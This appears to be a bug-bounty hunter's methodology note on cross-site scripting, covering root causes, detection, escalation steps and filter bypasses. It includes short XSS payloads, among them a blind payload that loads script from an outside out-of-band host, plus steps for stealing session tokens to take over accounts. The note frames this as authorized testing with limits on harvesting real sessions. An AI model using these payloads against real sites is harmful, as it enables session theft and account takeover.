# XSS

> Attacker-controlled data runs as script in a victim's authenticated origin. Stored + 0-click on a sensitive app = session/account theft.

## Root cause
Data crosses into an HTML/JS/URL context without the encoding that context requires. The gap: output encoding is applied for one context but the sink lives in another (attribute vs. HTML vs. JS vs. URL), or a client-side framework `innerHTML`s untrusted input, or a sanitizer is bypassed by DOM mutation.

## Where it hides
- Reflected: search boxes, error messages, `redirect`/`return`/`next` params echoed into HTML, 404 paths.
- Stored: profile fields (name, bio, company), comments, filenames, support tickets, webhooks, admin-viewed logs (blind XSS).
- DOM: `location.hash`/`search` → `innerHTML`/`document.write`/`eval`/jQuery `$()`/`el.src`, `postMessage` handlers, client-side templating (`{{}}`, `v-html`, `dangerouslySetInnerHTML`).
- Mutation (mXSS): sanitized HTML re-parsed differently by the browser (`<noscript>`, `<template>`, namespace confusion).

## Detection
- Inject a unique marker (`bxss1337`) into every field; grep responses and re-render points for it unencoded. Note the *context* it lands in.
- Blind XSS: seed an OOB payload (`"><script src=//x.oast.me></script>`) into staff-facing fields; wait for the callback.
- DOM: DevTools search sinks, set breakpoints on `innerHTML`/`eval`; trace `hash`→sink. Tools: DOM Invader.
- Build the payload for the exact context — break out of the attribute/tag/JS string first.

## Minimum-evidence bar
The payload **actually executes** in the victim origin — `alert(document.domain)` fired, or (better) a captured callback proving script ran (cookie/DOM read exfil'd to your listener). Mirror `../../references/validation-gate.md`: reflected-but-HTML-encoded is not XSS; a marker in a response is not execution. Prove with `document.domain` and stop; don't harvest real sessions.

## Depth ladder
1. Break out of the context and pop `alert(document.domain)`.
2. Stored + 0-click on an authenticated page — persistence multiplies value.
3. Blind XSS into an admin/support panel → cross-privilege execution.
4. Steal the session/CSRF token → replay → **ATO** (demonstrate on your own second account).
5. CSP present? Find a bypass: JSONP endpoint, `unsafe-inline`/`unsafe-eval`, allow-listed CDN with a gadget, dangling-markup exfil, base-uri hijack.
6. mXSS through the sanitizer; SVG/`<math>` namespace, `<style>`+`@import`.
7. Framework gadget (Angular sandbox escape, Vue `v-html`, template injection → RCE-on-client).
See `../payloads/xss.md`.

## Bypass notes
- Tag/keyword filters: case, `<sVg oNload>`, `<img src=x onerror=>`, `<iframe srcdoc>`, event handlers without `on` prefix via HTML entities.
- Quote/space stripped: `/**/`, `%09`, backticks, `<svg/onload=>`.
- WAF: HTML-entity/URL/unicode encode, `String.fromCharCode`, `alert`, split payload across params. See `../bypass-tables.md`.
- Angle brackets encoded → attribute-context injection (`" autofocus onfocus=`), `javascript:` URI in `href`.

## Chain potential
XSS → token theft → ATO. Stored XSS in a shared doc → worm across tenants. XSS + CSRF → state change. Self-XSS + CSRF/login-CSRF → real XSS. See `../../references/chaining.md`.

## Real paid example
Stored XSS in a CRM "company name" field rendered unencoded in the internal agent dashboard. Blind payload fired in a support rep's session, exfil'd their session cookie to a collector — agent ATO with access to all customer tickets. Band: **$3k–$10k** (stored, blind, privileged victim).

## Rejected variants
- Self-XSS requiring the victim to paste a payload into their own console/field, with no delivery vector.
- Reflected value that is HTML-entity encoded (no execution).
- XSS on a sandboxed/isolated origin with no session or sensitive data.
- `alert(1)` on a static marketing page with no auth context and no CSP/impact story.
